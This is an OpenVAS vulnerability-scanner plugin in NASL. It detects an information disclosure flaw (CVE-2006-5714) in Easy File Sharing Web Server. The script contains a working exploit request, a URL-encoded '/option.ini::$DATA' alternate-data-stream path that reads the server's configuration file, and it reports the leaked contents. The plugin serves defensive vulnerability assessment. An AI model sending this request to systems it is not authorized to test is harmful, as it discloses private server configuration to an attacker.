# OpenVAS Vulnerability Test
# $Id: efs_webserver_infodisclose.nasl 16 2013-10-27 13:09:52Z jan $
# Description: Tries to read a local file via EFS
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2006 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server is affected by an information disclosure
vulnerability. 

Description :

The version of Easy File Sharing Web Server that is installed on the
remote host fails to restrict access to files via alternative data
streams.  By passing a specially-crafted request to the web server, an
attacker may be able to access privileged information. 

See Also :

http://www.milw0rm.com/exploits/2690";

tag_solution = "Unknown at this time.";

desc = "

 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
if (description)
{
	# set script identifiers
	script_id(80055);;
	script_version("$Revision: 16 $");
	script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
	script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
	
	script_cve_id("CVE-2006-5714");
	script_bugtraq_id(20823);
	script_xref(name:"OSVDB", value:"30150");

	name = "Easy File Sharing Web Server Information Disclosure";
	summary = "Tries to read a local file via EFS";

	script_name(name);
	script_description(desc);
	script_summary(summary);

	script_category(ACT_ATTACK);
	script_copyright("This script is Copyright (C) 2006 Justin Seitz");
	
	script_family("Web application abuses");

	script_dependencies("http_version.nasl");
	script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
	exit(0);

}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

#
#	Verify we can talk to the web server, if not exit
#
port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


banner = get_http_banner(port:port);
if (!banner || "Server: Easy File Sharing Web Server" >!< banner) exit(0);

#
#	We are sending an encoded request for /options.ini::$DATA to the web server.
#
attackreq = http_get(item:urlencode(str:"/option.ini::$DATA"),port:port);
attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
if (attackres == NULL) exit(0);

if ("[Server]" >< attackres) {
	info = string("Here are the contents of the 'options.ini' configuration file\n",
	"from the remote host: \n\n",attackres);
		
	report = string(desc,"\n\nPlugin Output\n\n", info);
	security_warning(data:report, port:port);		
}
